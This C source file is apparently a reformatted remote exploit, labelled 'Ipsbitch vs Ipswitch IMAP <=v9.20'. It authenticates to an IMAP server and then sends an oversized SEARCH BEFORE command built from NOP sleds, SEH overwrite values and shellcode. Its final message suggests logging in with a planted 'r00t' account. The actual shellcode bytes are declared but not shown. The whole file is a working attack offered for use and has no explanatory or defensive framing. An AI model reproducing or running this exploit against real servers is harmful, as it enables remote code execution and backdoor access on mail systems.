#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_2__   TYPE_1__ ;

/* Type definitions */
struct timeval {int tv_sec; scalar_t__ tv_usec; } ;
struct TYPE_2__ {void* s_addr; } ;
struct sockaddr_in {int /*<<< orphan*/  sin_port; TYPE_1__ sin_addr; int /*<<< orphan*/  sin_family; } ;
struct sockaddr {int dummy; } ;
struct fd_set {int dummy; } ;
typedef  int /*<<< orphan*/  server ;
typedef  int /*<<< orphan*/  recvbuf ;
typedef  int /*<<< orphan*/  payload ;
typedef  int /*<<< orphan*/  auth ;
typedef  int /*<<< orphan*/  WSADATA ;
typedef  scalar_t__ SOCKET ;

/* Variables and functions */
 int /*<<< orphan*/  AF_INET ; 
 scalar_t__ FD_ISSET (scalar_t__,struct fd_set*) ; 
 int /*<<< orphan*/  FD_SET (scalar_t__,struct fd_set*) ; 
 int /*<<< orphan*/  FD_ZERO (struct fd_set*) ; 
 scalar_t__ INVALID_SOCKET ; 
 int /*<<< orphan*/  MAKEWORD (int,int /*<<< orphan*/ ) ; 
 scalar_t__ SOCKET_ERROR ; 
 int /*<<< orphan*/  SOCK_STREAM ; 
 int /*<<< orphan*/  Sleep (int) ; 
 int /*<<< orphan*/  WSAConnect (scalar_t__,struct sockaddr*,int,int /*<<< orphan*/ *,int /*<<< orphan*/ *,int /*<<< orphan*/ *,int /*<<< orphan*/ *) ; 
 scalar_t__ WSAStartup (int /*<<< orphan*/ ,int /*<<< orphan*/ *) ; 
 int atoi (char*) ; 
 int /*<<< orphan*/  error (char*) ; 
 int /*<<< orphan*/  fprintf (int /*<<< orphan*/ ,char*,...) ; 
 void* htonl (int) ; 
 int /*<<< orphan*/  htons (int) ; 
 int inet_addr (char*) ; 
 int /*<<< orphan*/  memset (char*,int /*<<< orphan*/ ,int) ; 
 char* nextseh ; 
 int /*<<< orphan*/  recv (scalar_t__,char*,int,int /*<<< orphan*/ ) ; 
 char* seh ; 
 int /*<<< orphan*/  select (scalar_t__,int /*<<< orphan*/ *,struct fd_set*,int /*<<< orphan*/ *,struct timeval*) ; 
 scalar_t__ send (scalar_t__,char*,int,int /*<<< orphan*/ ) ; 
 char* shellcode ; 
 scalar_t__ socket (int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  stderr ; 
 int /*<<< orphan*/  strcat (char*,char*) ; 
 int strlen (char*) ; 
 int /*<<< orphan*/  strncpy (char*,char*,int) ; 
 int /*<<< orphan*/  usage () ; 

int main(int argc, char *argv[])
{
	SOCKET s;
	struct fd_set mask;
	struct timeval timeout; 
	struct sockaddr_in server;

	char user[20], pass[20];
	char payload[2048];
	char recvbuf[1024];
	if(argc < 4)
	{
		usage();
		return 0;
	}

	if((strlen(argv[3])<15) && (strlen(argv[4])<15))
	{
		strncpy(user, argv[3], 14);
		strncpy(pass, argv[4], 14);
		user[14] = '\0';
		pass[14] = '\0';
	}
	else {
		usage();
		return 0;
	}

	int ipaddr=htonl(inet_addr(argv[1])), port=atoi(argv[2]);;

	fprintf(stderr, "Ipsbitch vs Ipswitch IMAP <=v9.20\n(C) dmc <dmc@deadbeef.co.uk>\n\n");

	char auth[50];
	memset(auth, 0, sizeof(auth));
	memset(recvbuf, 0, sizeof(recvbuf));
	strcat(auth, "0 LOGIN ");
	strcat(auth, user);
	strcat(auth, " ");
	strcat(auth, pass);
	strcat(auth, "\r\n");
	strcat(auth, "\0");

	memset(payload, 0, sizeof(payload));
	strcat(payload, "2 SEARCH BEFORE ");
	for(int i=0; i<80; i++) strcat(payload, "\x90");
	strcat(payload, nextseh);
	strcat(payload, seh);
	for(int i=0; i<100; i++) strcat(payload, "\x90");
	strcat(payload, shellcode);
	for(int i=0; i<300; i++) strcat(payload, "\x90");
	strcat(payload, "\r\n");

	WSADATA info;
    if (WSAStartup(MAKEWORD(2,0), &info)) error("Unable to start WSA");

	s=socket(AF_INET,SOCK_STREAM,0);
	if (s==INVALID_SOCKET) error("[*] socket error");
	server.sin_family=AF_INET;
	server.sin_addr.s_addr=htonl(ipaddr);
	server.sin_port=htons(port);	

	WSAConnect(s,(struct sockaddr *)&server,sizeof(server),NULL,NULL,NULL,NULL);
	timeout.tv_sec=3;timeout.tv_usec=0;FD_ZERO(&mask);FD_SET(s,&mask);

	select(s+1,NULL,&mask,NULL,&timeout);
	if(FD_ISSET(s,&mask))
		{
			fprintf(stderr, "[*] Connecting to IMAP server\n");
			Sleep(1000);recv(s,recvbuf,200,0);
			fprintf(stderr, "[*] Got banner:\n%s\n", recvbuf);
			memset(recvbuf, 0, sizeof(recvbuf));
			fprintf(stderr, "[*] Authenticating...\n");
			if (send(s,auth,strlen(auth),0)==SOCKET_ERROR) error("[*] error sending auth payload");
			memset(auth, 0, sizeof(auth));
			Sleep(1000);recv(s,recvbuf,200,0);
			fprintf(stderr, "[*] Received:\n%s\n", recvbuf);
			memset(recvbuf, 0, sizeof(recvbuf));
			fprintf(stderr, "[*] Sending SELECT command...\n");
			if (send(s,"1 SELECT INBOX\r\n",strlen("1 SELECT INBOX\r\n"),0)==SOCKET_ERROR) error("[*] error sending auth payload");
			Sleep(1000);recv(s,recvbuf,200,0);
			fprintf(stderr, "[*] Received:\n%s\n", recvbuf);
			memset(recvbuf, 0, sizeof(recvbuf));
			Sleep(1000);recv(s,recvbuf,200,0);
			fprintf(stderr, "[*] Received:\n%s\n", recvbuf);
			fprintf(stderr, "[*] Sending exploit payload...\n");
			if (send(s,payload,strlen(payload),0)==SOCKET_ERROR) error("[*] error sending exploit payload");
			memset(payload, 0, sizeof(payload));
			fprintf(stderr, "[*] Now try USER=r00t PASS=r00tr00t!!\n");
			return 0;
		}
}